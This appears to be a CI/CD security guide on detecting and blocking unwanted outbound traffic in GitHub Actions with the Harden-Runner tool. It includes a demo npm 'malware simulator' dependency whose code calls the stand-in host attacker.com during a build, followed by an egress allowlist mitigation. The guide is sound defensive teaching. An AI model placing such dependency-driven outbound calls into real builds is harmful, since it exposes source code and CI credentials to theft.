# Filter Network Traffic

## Example Action: 
Description:
An example GitHub Actions workflow that allows unrestricted outbound network access, potentially exposing source code and CI/CD credentials.

```
name: "Hosted: Network Monitoring with Harden-Runner"
on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit
      - uses: actions/checkout@v3
      - name: npm install
        run: |
          cd ./src/exfiltration-demo
          npm install
      - name: Publish to Registry
        uses: elgohr/Publish-Docker-Github-Action@v5
        with:
          name: ${{ github.repository }}/prod:latest
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          registry: ghcr.io
          workdir: ./src/exfiltration-demo
```

Here src/package.json has following dependencies
```
  "dependencies": {
    "@step-security/malware-simulator": "file:../malware-simulators/exfiltration-simulator"
  },
```

And the malware-simulator is making a call to `https://attacker.com/`
```
https
  .get("https://attacker.com/", (res) => {
    // handle response
  }
```

## Steps to Identify the Vulnerability:
### Review Outbound Network Access:
Use `step-security/harden-runner@v2` in your workflow and then Run the workflow.
```
- uses: step-security/harden-runner@v2
  with:
    egress-policy: audit
```

After the workflow completes, check out the build logs. In the Harden-Runner step, you will see a link to security insights and recommendations.

## Steps to Mitigate the Vulnerability:
### Block calls to domains 
Analyze the output of the Harden-Runner step, it will give you insight from where the calls to unwanted domains are happening. You can either choose to replace such code or you can choose to block calls to all domains except the allowed domains which you configure. You can do this configuration by changing the `step-security/harden-runner@v2` step as follow
```
- name: Harden Runner
  uses: step-security/harden-runner@v2
  with:
    disable-sudo: true
    egress-policy: block
    allowed-endpoints: >
      ghcr.io:443
      github.com:443
      registry.npmjs.org:443
```

